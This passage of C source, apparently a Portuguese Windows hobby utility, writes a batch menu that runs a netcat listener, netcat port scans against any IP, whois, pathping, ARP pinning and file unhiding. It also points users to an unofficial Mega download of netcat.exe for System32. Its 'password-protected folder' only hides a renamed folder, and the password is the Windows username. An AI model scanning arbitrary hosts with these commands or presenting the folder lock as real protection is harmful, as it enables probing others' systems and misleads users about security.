	fprintf(arqWin,"CD %%windir%%\\system32                                                                                   \n");
	fprintf(arqWin,"IF EXIST netcat.exe GOTO :2netcat                                                                         \n");
	fprintf(arqWin,"IF NOT EXIST netcat.exe GOTO :1netcat                                                                     \n");

	fprintf(arqWin,":1netcat                                                                                                  \n");
	fprintf(arqWin,"echo.                                                                                                     \n");
	fprintf(arqWin,"echo   E necessario ter o Netcat instalado na pasta System32!                                             \n");
	fprintf(arqWin,"echo.                                                                                                     \n");
	fprintf(arqWin,"echo   netcat.exe n∆o encontrado!                                                                         \n");
	fprintf(arqWin,"echo.                                                                                                     \n");
	fprintf(arqWin,"choice /C SN /M \"Deseja baixar o aplicativo\"                                                            \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :1download                                                                      \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :B                                                                       \n");      //l491
                      

	fprintf(arqWin,":1download                                                                                          \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"echo   A pagina de download sera aberta em seu navegador padrao, aguarde!                           \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"start https://mega.nz/#!zdEExThA!qmz6hjGCSabC6_9owQ5qiSTjBtH6dPV_DZMLZIaPn0U                        \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                                       \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :B                                                                        \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                           \n");

	fprintf(arqWin,":2netcat                                                                                            \n");
	fprintf(arqWin,"start netcat -L -vv -p %%hpdoor%%                                                                   \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"echo   Honeypot ativado!                                                                            \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                                       \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :B                                                                        \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                           \n"); //l511


	fprintf(arqWin,":3C                                                                                    \n");
	fprintf(arqWin,"cls                                                                                    \n");
	fprintf(arqWin,"echo.                                                                                  \n");
	fprintf(arqWin,"echo * Protecao de pasta com senha               .----.                                \n");
	fprintf(arqWin,"echo   ^|                                        / .--.\\                              \n");
	fprintf(arqWin,"echo   +-^> 1 - Gerar pasta (Secret)            / /   \\\\                             \n");
	fprintf(arqWin,"echo   ^|                                       ^| ^|    ^| ^|                         \n");
	fprintf(arqWin,"echo   +-^> 2 - Desbloquear pasta               ^| ^|.----.^|                          \n");
	fprintf(arqWin,"echo   ^|                                      ///`.::::.`\\                           \n");
	fprintf(arqWin,"echo   +-^> 3 - Retornar ao menu anterior     ^|^|^| ::/  \\:: ;                       \n");
	fprintf(arqWin,"echo                                         ^|^|; ::\\__/:: ;                         \n");
	fprintf(arqWin,"echo                                       \\\\\\ '::::' /                             \n");
	fprintf(arqWin,"echo                                      jgs   '=':-..-'`                              \n");
	fprintf(arqWin,"echo.                                                                                  \n");

	fprintf(arqWin,"choice /C 123 /M \"Escolha uma das opcoes\"                                            \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :dirpass                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :UNLOCK                                                      \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :B                                                           \n");      //l532


	fprintf(arqWin,":dirpass                                                                                         \n");
	fprintf(arqWin,"echo.                                                                                            \n");
	fprintf(arqWin,"echo   Apoes a pasta \"Secret\" ser gerada, salve dentro dela os arquivos que voce                \n");
	fprintf(arqWin,"echo   quer proteger contra acessos indevidos. Feito isso, escolha a opcao                       \n");
	fprintf(arqWin,"echo   \"bloquear com senha o acesso a pasta\".                                                  \n");
	fprintf(arqWin,"echo   Para desbloquear, basta acessar o recurso de \"Protecao de pasta com senha\" e             \n");
	fprintf(arqWin,"echo   selecionar a opcao \"Desbloquear pasta\" (necessita digitar a senha).                     \n");
	fprintf(arqWin,"echo.                                                                                            \n");
	fprintf(arqWin,"IF EXIST \"Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}\" goto UNLOCK                   \n");
	fprintf(arqWin,"IF NOT EXIST Secret goto MDLOCKER                                                                \n");

	fprintf(arqWin,":block                                                                                           \n");
	fprintf(arqWin,"choice /C SN /M \"Bloquear com senha o acesso a pasta?\"                                         \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :LOCK                                                                  \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :B                                                                     \n");

	fprintf(arqWin,":LOCK                                                                                            \n");
	fprintf(arqWin,"ren Secret \"Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}\"                             \n");
	fprintf(arqWin,"attrib +r +h +s \"Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}\"                        \n");
	fprintf(arqWin,"echo.                                                                                            \n");
	fprintf(arqWin,"echo   Pasta bloqueada! Senha para desbloqueio: %%USERNAME%%                                     \n");
	fprintf(arqWin,"echo.                                                                                            \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :B                                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                        \n");

	fprintf(arqWin,":UNLOCK                                                                                          \n");
	fprintf(arqWin,"echo.                                                                                            \n");
	fprintf(arqWin,"SET /P pass=   Digite a senha:                                                                   \n");
	fprintf(arqWin,"IF NOT %%pass%%==%%USERNAME%% goto FAIL                                                          \n");
	fprintf(arqWin,"attrib -r -h -s \"Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}\"                        \n");
	fprintf(arqWin,"ren \"Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}\" Secret                             \n");
	fprintf(arqWin,"echo.                                                                                            \n");
	fprintf(arqWin,"echo   Pasta desbloqueada!                                                                       \n");
	fprintf(arqWin,"echo.                                                                                            \n");
	fprintf(arqWin,"pause                                                                                            \n");
	fprintf(arqWin,"goto :B                                                                                          \n");

	fprintf(arqWin,":FAIL                                                                                            \n");
	fprintf(arqWin,"echo Senha incorreta!                                                                            \n");
	fprintf(arqWin,"echo.                                                                                            \n");
	fprintf(arqWin,"pause                                                                                            \n");
	fprintf(arqWin,"goto :B                                                                                          \n");

	fprintf(arqWin,":MDLOCKER                                                                                        \n");
	fprintf(arqWin,"MD Secret                                                                                        \n");
	fprintf(arqWin,"echo.                                                                                            \n");
	fprintf(arqWin,"echo   Pasta criada com sucesso!                                                                 \n");
	fprintf(arqWin,"echo.                                                                                            \n");
	fprintf(arqWin,"goto :block                                                                                      \n");

	fprintf(arqWin,":4C                                                                                              \n");
	fprintf(arqWin,"cls                                                                                              \n");
	fprintf(arqWin,"echo.                                                                                            \n");
	fprintf(arqWin,"echo * Protecao contra Arp Spoofing                                                              \n");
	fprintf(arqWin,"echo   ^|                                                                                        \n");
	fprintf(arqWin,"echo   +-^> 1 - Aplicar protecao                                                                 \n");
	fprintf(arqWin,"echo   ^|                                                                                        \n");
	fprintf(arqWin,"echo   +-^> 2 - Desfazer uma protecao                                                            \n");
	fprintf(arqWin,"echo   ^|                                                                                        \n");
	fprintf(arqWin,"echo   +-^> 3 - Retornar ao menu anterior                                                        \n");
	fprintf(arqWin,"echo.                                                                                            \n");

	fprintf(arqWin,"choice /C 123 /M \"Escolha uma das opcoes\"                                                      \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :1C1                                                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :1C2                                                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :B                                                                     \n");

	fprintf(arqWin,":1C1                                                                                             \n");
	fprintf(arqWin,"echo.                                                                                            \n");
	fprintf(arqWin,"echo   + Criar entrada arp segura +                                                              \n");
	fprintf(arqWin,"echo.                                                                                            \n");
	fprintf(arqWin,"SET /P IP=Digite o endereco IP do seu gateway (roteador):                                        \n");
	fprintf(arqWin,"echo.                                                                                            \n");
	fprintf(arqWin,"SET /P MAC=Digite o endereco MAC do gateway:                                                     \n");
	fprintf(arqWin,"netsh interface ipv4 add neighbors \"local\" \"%%IP%%\" \"%%MAC%%\"                              \n");
	fprintf(arqWin,"echo.                                                                                            \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :4C                                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                        \n"); //l616


	fprintf(arqWin,":1C2                                                                                              \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"SET /P IP2=Digite o endereco IP do seu gateway (roteador):                                        \n");
	fprintf(arqWin,"netsh interface ipv4 del neighbors \"local\" \"%%IP2%%\"                                          \n");
	fprintf(arqWin,"echo.                                                                                             \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :4C                                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                         \n");

	fprintf(arqWin,":5C                                                                                               \n");
	fprintf(arqWin,"cls                                                                                               \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"echo * Revelar arquivos ocultos                                                                   \n");
	fprintf(arqWin,"echo   ^|                                                                                         \n");
	fprintf(arqWin,"echo   +-^> 1 - Verificar diret¢rio atual                                                         \n");
	fprintf(arqWin,"echo   ^|                                                                                         \n");
	fprintf(arqWin,"echo   +-^> 2 - Alterar diret¢rio                                                                 \n");
	fprintf(arqWin,"echo   ^|                                                                                         \n");
	fprintf(arqWin,"echo   +-^> 3 - Revelar arquivos                                                                  \n");
	fprintf(arqWin,"echo   ^|                                                                                         \n");
	fprintf(arqWin,"echo   +-^> 4 - Retornar ao menu anterior                                                         \n");
	fprintf(arqWin,"echo.                                                                                             \n");

	fprintf(arqWin,"choice /C 1234 /M:\"Escolha uma das opcoes\"                                                      \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :ver1A                                                                  \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :ir1A                                                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :abra                                                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==4 goto :B                                                                      \n");

	fprintf(arqWin,":ver1A                                                                                             \n");
	fprintf(arqWin,"cls                                                                                                \n");
	fprintf(arqWin,"echo.                                                                                              \n");
	fprintf(arqWin,"dir | find /N \"Pasta\"                                                                            \n");
	fprintf(arqWin,"echo.                                                                                              \n");
	fprintf(arqWin,"echo   Verificacao conclu°da!                                                                      \n");
	fprintf(arqWin,"echo.                                                                                              \n");

	fprintf(arqWin,"choice /C SN /M:\"Retornar ao menu anterior\"                                                      \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :5C                                                                      \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                          \n");

	fprintf(arqWin,":ir1A                                                                                              \n");
	fprintf(arqWin,"echo.                                                                                              \n");
	fprintf(arqWin,"SET /P DIR=Digite a letra do diretorio:                                                            \n");
	fprintf(arqWin,"echo.                                                                                              \n");

	fprintf(arqWin,"choice /C SN /M:\"Alterar o diret¢rio atual para o %%DIR%%?\"                                       \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :godir1                                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :5C                                                                         \n");

	fprintf(arqWin,":abra                                                                                               \n");
	fprintf(arqWin,"cls                                                                                                 \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"echo   Apenas os arquivos ocultos que estiverem dentro do diret¢rio                                 \n");
	fprintf(arqWin,"echo   atual ser∆o relevados!                                                                       \n");
	fprintf(arqWin,"echo.                                                                                               \n");

	fprintf(arqWin,"choice /C SN /M:\"Deseja prosseguir?\"                                                              \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :prossiga                                                                 \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :5C                                                                       \n");

	fprintf(arqWin,":prossiga                                                                                           \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"attrib -h *.*                                                                                       \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"echo   Conclu°do! Verifique o diretorio.                                                            \n");
	fprintf(arqWin,"echo.                                                                                               \n");

	fprintf(arqWin,"choice /C SN /M:\"Deseja verificar?\"                                                               \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :verifique                                                                \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :5C                                                                       \n");

	fprintf(arqWin,":verifique                                                                                          \n");
	fprintf(arqWin,"cls                                                                                                 \n");
	fprintf(arqWin,"ping 127.0.01 -n 2 > nul                                                                            \n");
	fprintf(arqWin,"tree /f /a                                                                                          \n");
	fprintf(arqWin,"echo.                                                                                               \n");

	fprintf(arqWin,"choice /C SN /M:\"Salvar o resultado em um arquivo de log\"                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :savlog1                                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :5C                                                                         \n");

	fprintf(arqWin,":savlog1                                                                                            \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"echo   Os resultados serao salvos no arquivo \"Resultado.txt\"                                      \n");
	fprintf(arqWin,"IF EXIST Resultado.txt GOTO :x01x                                                                   \n");
	fprintf(arqWin,"IF NOT EXIST Resultado.txt GOTO :savlog2                                                            \n");

	fprintf(arqWin,":x01x                                                                                               \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"echo   Ja existe um arquivo \"Resultado.txt\" no diretorio atual!                                   \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"echo   Nao sera possivel salvar os resultados!                                                      \n");
	fprintf(arqWin,"echo.                                                                                               \n");

	fprintf(arqWin,"choice /C SN /M:\"Retornar ao menu anterior\"                                                       \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :5C                                                                       \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                         \n");  //l717


	fprintf(arqWin,":savlog2                                                                                                    \n");
	fprintf(arqWin,"echo Analise minunciosamente a lista abaixo p que possa identificar os arquivos revelados >> Resultado.txt  \n");
	fprintf(arqWin,"echo. >> Resultado.txt                                                                                      \n");
	fprintf(arqWin,"tree /f /a >> Resultado.txt                                                                                 \n");
	fprintf(arqWin,"echo.                                                                                                       \n");
	fprintf(arqWin,"echo   Log gerado! Verifique o arquivo \"Resultado.txt\"                                                    \n");
	fprintf(arqWin,"echo.                                                                                                       \n");

	fprintf(arqWin,"choice /C SN /M:\"Retornar ao menu anterior\"                                                               \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :5C                                                                               \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                                   \n");

	fprintf(arqWin,":godir1                                                                                                     \n");
	fprintf(arqWin,"echo.                                                                                                       \n");
	fprintf(arqWin,"%%DIR%%:                                                                                                    \n");
	fprintf(arqWin,"echo   Alteracao conclu°da!                                                                                 \n");
	fprintf(arqWin,"echo.                                                                                                       \n");

	fprintf(arqWin,"choice /C SN /M:\"Verificar diret¢rio atual?\"                                                              \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :ver1A                                                                            \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :5C                                                                               \n");

	fprintf(arqWin,":C                                                                                                          \n");
	fprintf(arqWin,"cls                                                                                                         \n");
	fprintf(arqWin,"echo.                                                                                                       \n");
	fprintf(arqWin,"echo * Scan e Monitoramento                                                                                 \n");
	fprintf(arqWin,"echo   ^|                                                                                                   \n");
	fprintf(arqWin,"echo   +-^> 1 - Consulta (Whois)                                                                        \n");         
	fprintf(arqWin,"echo   ^|                                                                                                \n");
	fprintf(arqWin,"echo   +-^> 2 - Port Scan (Netcat)                                                                       \n");
	fprintf(arqWin,"echo   ^|                                                                                                \n");
	fprintf(arqWin,"echo   +-^> 3 - Rastrear a rota para um IP                                                               \n");
	fprintf(arqWin,"echo   ^|                                                                                                \n");
	fprintf(arqWin,"echo   +-^> 4 - Rastrear um IP (via navegador web)                                                       \n");
	fprintf(arqWin,"echo   ^|                                                                                                \n");
	fprintf(arqWin,"echo   +-^> 5 - Verificar o IP retornado pelo DNS para um site                                           \n");
	fprintf(arqWin,"echo   ^|                                                                                                \n");
	fprintf(arqWin,"echo   +-^> 6 - Retornar ao menu principal                                                               \n");
	fprintf(arqWin,"echo.                                                                                                    \n");

	fprintf(arqWin,"choice /C 123456 /M \"Escolha uma das opcoes\"                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :1C1                                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :2C2                                                                           \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :3C3                                                                          \n");    
	fprintf(arqWin,"IF %%ERRORLEVEL%%==4 goto :4C4                                                                          \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==5 goto :5C5                                                                          \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==6 goto 1x                                                                            \n");

	fprintf(arqWin,":1C1                                                                                                    \n");
	fprintf(arqWin,"cls                                                                                                     \n");
	fprintf(arqWin,"C:                                                                                                      \n");
	fprintf(arqWin,"CD %%windir%%\\system32                                                                                  \n");
	fprintf(arqWin,"IF EXIST whois.exe GOTO :whois1                                                                         \n");
	fprintf(arqWin,"IF NOT EXIST whois.exe GOTO :whois2                                                                    \n"); //l773


	fprintf(arqWin,":whois1                                                                                                \n");
	fprintf(arqWin,"cls                                                                                                    \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"echo   +---------------------------+                                                                   \n");
	fprintf(arqWin,"echo   ^|      __________________   ^|                                                                 \n");
	fprintf(arqWin,"echo   ^|  ==c(______(o(______(_()  ^|                                                                 \n"); 
	fprintf(arqWin,"echo   ^|             )=\\          ^|                                                                 \n");
	fprintf(arqWin,"echo   ^|            //\\\\         ^|                                                                 \n");
	fprintf(arqWin,"echo   ^|           //  \\\\        ^|                                                                 \n"); 
	fprintf(arqWin,"echo   ^|          //Whois\\\\      ^|                                                                 \n");
	fprintf(arqWin,"echo   ^|         //       \\\\     ^|                                                                 \n");
	fprintf(arqWin,"echo   ^|        //         \\\\    ^|                                                                 \n");
	fprintf(arqWin,"echo   +---------------------------+                                                                   \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"SET /P whois3= Digite o endereco (URL):                                                                \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"start whois %%whois3%%                                                                                 \n");
	fprintf(arqWin,"echo.                                                                                                  \n");

	fprintf(arqWin,"choice /C SN /M \"Salvar o resultado em um arquivo de log\"                                            \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :whois4                                                                      \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :C                                                                           \n");

	fprintf(arqWin,":whois4                                                                                                \n");
	fprintf(arqWin,"cls                                                                                                    \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"echo   O resultado sera salvo no arquivo \"whois.txt\" em sua Desktop!                                 \n");
	fprintf(arqWin,"ping 127.0.01 -n 3 > nul                                                                               \n");
	fprintf(arqWin,"C:                                                                                                     \n");
	fprintf(arqWin,"CD C:\\Users\\%%USERNAME%%\\Desktop                                                                    \n");
	fprintf(arqWin,"IF EXIST whois.txt GOTO :whois5                                                                        \n");
	fprintf(arqWin,"IF NOT EXIST whois.txt GOTO :whois6                                                                    \n");

	fprintf(arqWin,":whois6                                                                                                \n");
	fprintf(arqWin,"whois %%whois3%% > whois.txt                                                                           \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"echo   Conclu°do!                                                                                      \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"pause                                                                                                  \n");
	fprintf(arqWin,"goto :C                                                                                                \n");

	fprintf(arqWin,":whois5                                                                                                \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"echo   Nao sera poss°vel gerar o arquivo!                                                              \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"echo   \"whois.txt\" ja existe na area de trabalho!                                                    \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"pause                                                                                                  \n");
	fprintf(arqWin,"goto :C                                                                                                \n");

	fprintf(arqWin,":whois2                                                                                                \n");
	fprintf(arqWin,"cls                                                                                                    \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"echo   E necessario ter o Whois instalado na pasta System32!                                           \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"echo   whois.exe n∆o encontrado!                                                                       \n");
	fprintf(arqWin,"echo.                                                                                                  \n");
	fprintf(arqWin,"choice /C SN /M \"Deseja baixar o aplicativo\"                                                         \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :downloadw                                                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :C                                                                           \n");

	fprintf(arqWin,":downloadw                                                                                            \n");
	fprintf(arqWin,"cls                                                                                                   \n");
	fprintf(arqWin,"echo.                                                                                                 \n");
	fprintf(arqWin,"echo   O download sera iniciado em seu navegador padr∆o, aguarde!                                     \n");
	fprintf(arqWin,"echo.                                                                                                 \n");
	fprintf(arqWin,"start https://download.sysinternals.com/files/WhoIs.zip                                               \n");
	fprintf(arqWin,"ping 127.0.01 -n 10 > nul                                                                             \n");
	fprintf(arqWin,"echo   Download conclu°do!                                                                            \n");
	fprintf(arqWin,"echo.                                                                                                 \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao anterior\"                                                              \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :C                                                                          \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                             \n");

	fprintf(arqWin,":2C2                                                                                              \n");                
	fprintf(arqWin,"cls                                                                                               \n");
	fprintf(arqWin,"C:                                                                                                \n");
	fprintf(arqWin,"CD %%windir%%\\system32                                                                           \n");
	fprintf(arqWin,"IF EXIST netcat.exe GOTO :netcat1                                                                 \n");
	fprintf(arqWin,"IF NOT EXIST netcat.exe GOTO :netcat2                                                            \n"); //l857

	fprintf(arqWin,":netcat1                                                                                           \n");
	fprintf(arqWin,"cls                                                                                                \n");
	fprintf(arqWin,"echo.                                                                                              \n");
	fprintf(arqWin,"echo   +---------------------------+                                                               \n");
	fprintf(arqWin,"echo   ^|      __________________   ^|                                                             \n");
	fprintf(arqWin,"echo   ^|  ==c(______(o(______(_()  ^|                                                             \n");
	fprintf(arqWin,"echo   ^|             )=\\          ^|                                                             \n");
	fprintf(arqWin,"echo   ^| Port Scan  //\\\\         ^|                                                             \n");
	fprintf(arqWin,"echo   ^|           // \\\\         ^|                                                             \n");
	fprintf(arqWin,"echo   ^|          //   \\\\        ^|                                                             \n");
	fprintf(arqWin,"echo   ^|         //     \\\\       ^|                                                            \n");
	fprintf(arqWin,"echo   ^|        //       \\\\      ^|                                                            \n");
	fprintf(arqWin,"echo   +---------------------------+                                                              \n");
	fprintf(arqWin,"echo   ^|                                                                                         \n");
	fprintf(arqWin,"echo   +-^> 1 - Servicos                                                                          \n");
	fprintf(arqWin,"echo   ^|                                                                                         \n");
	fprintf(arqWin,"echo   +-^> 2 - Faixa                                                                             \n");
	fprintf(arqWin,"echo   ^|                                                                                         \n");
	fprintf(arqWin,"echo   +-^> 3 - Retornar ao menu anterior                                                         \n");
	fprintf(arqWin,"echo.                                                                                             \n");

	fprintf(arqWin,"choice /C 123 /M:\"Escolha uma das opcoes\"                                                         \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :service                                                                  \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :faixa                                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :C                                                                        \n");

	fprintf(arqWin,":service                                                                                          \n");
	fprintf(arqWin,"cls                                                                                               \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"echo   Faz uma varredura nas portas padr‰es dos principais servicos                               \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"SET /P IPNC=Digite o IP:                                                                          \n");
	fprintf(arqWin,"echo.                                                                                             \n");

	fprintf(arqWin,"choice /C SN /M:\"Iniciar scan\"                                                                     \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :service2                                                                  \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :netcat1                                                                   \n");

	fprintf(arqWin,":service2                                                                                           \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"netcat -vv %%IPNC%% 20 21 22 23 25 42 43 53 57 80 110 135 137 138 139 443 445 1080 3389 8080        \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"echo   Scan conclu°do!                                                                              \n");
	fprintf(arqWin,"echo.                                                                                               \n");
	fprintf(arqWin,"pause                                                                                               \n");
	fprintf(arqWin,"goto :C                                                                                             \n");

	fprintf(arqWin,":faixa                                                                                               \n");
	fprintf(arqWin,"cls                                                                                                  \n");
	fprintf(arqWin,"echo.                                                                                                \n");
	fprintf(arqWin,"echo   Faz uma varredura em determinada faixa de portas                                              \n");
	fprintf(arqWin,"echo.                                                                                                \n");
	fprintf(arqWin,"SET /P IPNC=Digite o IP:                                                                             \n");
	fprintf(arqWin,"echo.                                                                                                \n");
	fprintf(arqWin,"SET /P PORTA1=Digite o nß da porta inicial:                                                          \n");
	fprintf(arqWin,"echo.                                                                                                \n");
	fprintf(arqWin,"SET /P PORTA2=Digite o n da porta final:                                                             \n");
	fprintf(arqWin,"echo.                                                                                                \n");

	fprintf(arqWin,"choice /C SN /M:\"Iniciar scan\"                                                                    \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :faixa2                                                                   \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :netcat1                                                                  \n");

	fprintf(arqWin,":faixa2                                                                                              \n");
	fprintf(arqWin,"echo.                                                                                                \n");
	fprintf(arqWin,"netcat -vv %%IPNC%% -z %%PORTA1%%-%%PORTA2%%                                                         \n");
	fprintf(arqWin,"echo.                                                                                                \n");
	fprintf(arqWin,"echo   Scan conclu°do!                                                                               \n");
	fprintf(arqWin,"echo.                                                                                                \n");
	fprintf(arqWin,"pause                                                                                                \n");
	fprintf(arqWin,"goto :C                                                                                              \n");

	fprintf(arqWin,":netcat2                                                                                             \n");
	fprintf(arqWin,"cls                                                                                                  \n");
	fprintf(arqWin,"echo.                                                                                                \n");
	fprintf(arqWin,"echo   E necessario ter o Netcat instalado na pasta System32!                                        \n");
	fprintf(arqWin,"echo.                                                                                                \n");
	fprintf(arqWin,"echo   netcat.exe nao encontrado!                                                                    \n");
	fprintf(arqWin,"echo.                                                                                                \n");
	fprintf(arqWin,"choice /C SN /M \"Deseja baixar o aplicativo\"                                                       \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :downloadw2                                                                \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :C                                                                       \n");   //l940


	fprintf(arqWin,":downloadw2                                                                                        \n");
	fprintf(arqWin,"cls                                                                                                \n");
	fprintf(arqWin,"echo.                                                                                              \n");
	fprintf(arqWin,"echo   A pagina de download sera aberta em seu navegador padrao, aguarde!                          \n");
	fprintf(arqWin,"echo.                                                                                              \n");
	fprintf(arqWin,"start https://mega.nz/#!zdEExThA!qmz6hjGCSabC6_9owQ5qiSTjBtH6dPV_DZMLZIaPn0U                       \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                                      \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :C                                                                       \n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit                                                                          \n");

	fprintf(arqWin,":3C3                                                                                               \n");
	fprintf(arqWin,"cls                                                                                                \n");
	fprintf(arqWin,"echo.                                                                                              \n");
	fprintf(arqWin,"echo   +---------------------------+                                                               \n");
	fprintf(arqWin,"echo   ^| Rastrear rota para um IP  ^|                                                             \n");
	fprintf(arqWin,"echo   ^|      __________________   ^|                                                             \n");
	fprintf(arqWin,"echo   ^|  ==c(______(o(______(_()  ^|                                                             \n");
	fprintf(arqWin,"echo   ^|             )=\\          ^|                                                             \n");
	fprintf(arqWin,"echo   ^|            // \\\\        ^|                                                             \n");
	fprintf(arqWin,"echo   ^|           //   \\\\       ^|                                                            \n");  
	fprintf(arqWin,"echo   ^|          //     \\\\      ^|                                                            \n");
	fprintf(arqWin,"echo   ^|         //       \\\\     ^|                                                            \n");
	fprintf(arqWin,"echo   ^|        //         \\\\    ^|                                                            \n");
	fprintf(arqWin,"echo   +---------------------------+                                                              \n");
	fprintf(arqWin,"echo.                                                                                             \n");
	fprintf(arqWin,"SET /P IPT=Digite o IP:                                                                           \n");
	fprintf(arqWin,"pathping %%IPT%%                                                                                  \n");
	fprintf(arqWin,"echo.                                                                                             \n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"                                                     \n");
